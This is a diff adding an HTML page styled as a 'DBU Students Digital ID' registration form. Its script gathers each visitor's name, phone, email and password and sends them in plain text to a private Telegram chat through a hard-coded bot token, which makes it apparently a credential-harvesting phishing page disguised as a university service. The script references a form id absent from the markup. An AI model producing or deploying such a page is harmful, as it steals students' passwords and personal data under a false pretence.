@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>DBU Students</title>
+	<style>
+		* {
+			box-sizing: border-box;
+			margin: 0;
+			padding: 0;
+		}
+
+		body {
+			background: black;
+			font-family: Arial, sans-serif;
+			overflow: hidden;
+		}
+
+		.circle1, .circle2, .circle3 {
+			position: absolute;
+			border-radius: 50%;
+			opacity: 0.7;
+			z-index: -1;
+			filter: blur(30px);
+		}
+
+		.circle1 {
+			width: 250px;
+			height: 250px;
+			top: -50px;
+			left: -50px;
+			background: linear-gradient(45deg, blue, #00ff88);
+		}
+
+		.circle2 {
+			width: 120px;
+			height: 120px;
+			top: 40%;
+			left: 70%;
+			background: linear-gradient(45deg, cyan, #00ffee);
+		}
+
+		.circle3 {
+			width: 300px;
+			height: 300px;
+			bottom: -80px;
+			right: -80px;
+			background: linear-gradient(45deg, skyblue, #00aaff);
+		}
+
+		h1 {
+			margin-top: 20px;
+			font-size: 2em;
+			color: white;
+			text-align: center;
+			font-weight: bold;
+			text-shadow: 0 0 5px white, 0 0 10px #00ff88;
+		}
+
+		p {
+			margin: 10px 0;
+			font-size: 1.2em;
+			color: #aaa;
+			text-align: center;
+		}
+
+		.container {
+			width: 90%;
+			height: 60%;
+			max-width: 400px;
+			margin: 0 auto;
+			background: rgba(13, 123, 23, 0.4);
+			padding: 20px;
+			border-radius: 15px;
+			box-shadow: 0 0 10px #0f0, 0 0 30px #00ff88;
+		}
+
+		input {
+			width: 100%;
+			padding: 10px;
+			margin: 10px 0;
+			border: none;
+			outline: none;
+			background: rgba(255, 255, 255, 0.1);
+			color: white;
+			font-size: 1em;
+			border-radius: 5px;
+			border-bottom: 2px solid #0f0;
+			transition: border-bottom-color 0.3s;
+		}
+
+		input:focus {
+			border-bottom-color: #00ff88;
+		}
+
+		.btn {
+			width: 100%;
+			padding: 10px;
+			border: none;
+			outline: none;
+			background: linear-gradient(45deg, #00ff88, #00aaff);
+			color: black;
+			font-size: 1.2em;
+			font-weight: bold;
+			border-radius: 25px;
+			cursor: pointer;
+			transition: transform 0.2s, box-shadow 0.2s;
+		}
+
+		.btn:hover {
+			transform: scale(1.05);
+			box-shadow: 0 0 15px #00aaff, 0 0 30px #00ff88;
+		}
+
+		@media (max-width: 768px) {
+			h1 {
+				font-size: 1.8em;
+			}
+
+			p {
+				font-size: 1em;
+			}
+
+			.circle1, .circle2, .circle3 {
+				filter: blur(20px);
+			}
+
+			.circle1 {
+				width: 200px;
+				height: 200px;
+			}
+
+			.circle3 {
+				width: 250px;
+				height: 250px;
+			}
+		}
+
+		@media (max-width: 480px) {
+			h1 {
+				font-size: 1.5em;
+			}
+
+			.container {
+				padding: 15px;
+			}
+
+			.circle1, .circle2, .circle3 {
+				filter: blur(15px);
+			}
+		}
+	</style>
+</head>
+<body>
+	<div class="circle1"></div>
+	<div class="circle2"></div>
+	<div class="circle3"></div>
+	<h1>DBU Students Digital ID</h1>
+	<p>Registration Form</p>
+	<div class="container">
+		<input type="text" id="name" placeholder="Enter your full name" required>
+		<input type="tel" id="phone" placeholder="Phone number" required>
+		<input type="email" id="email" placeholder="Enter your email address" required>
+		<input type="password" id="password" placeholder="Create a password" required><br /><br />
+		<button class="btn" type="submit">Register</button>
+	</div>
+	
+	<script>
+		document.getElementById("registrationForm").addEventListener("submit", function(event) {
+			event.preventDefault();
+			const name = document.getElementById("name").value;
+			const phone = document.getElementById("phone").value;
+			const email = document.getElementById("email").value;
+			const password = document.getElementById("password").value;
+			const message = `New Registration:\n\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nPassword: ${password}`;
+			const botToken = "7787010417:AAHLppc9xz2o9RstlWNjYrtDwXfrVV4Px_g";
+			const chatId = "6992364240";
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+			const data = { chat_id: chatId, text: message };
+			fetch(url, {
+				method: "POST",
+				headers: { "Content-Type": "application/json" },
+				body: JSON.stringify(data)
+			})
+			.then(response => response.json())
+			.then(result => {
+				if (result.ok) {
+					alert("Registration data sent successfully!");
+				} else {
+					alert("Failed to send data. Please try again.");
+				}
+			})
+			.catch(error => {
+				console.error("Error:", error);
+				alert("An error occurred while sending data.");
+			});
+		});
+	</script>
+</body>
+</html>
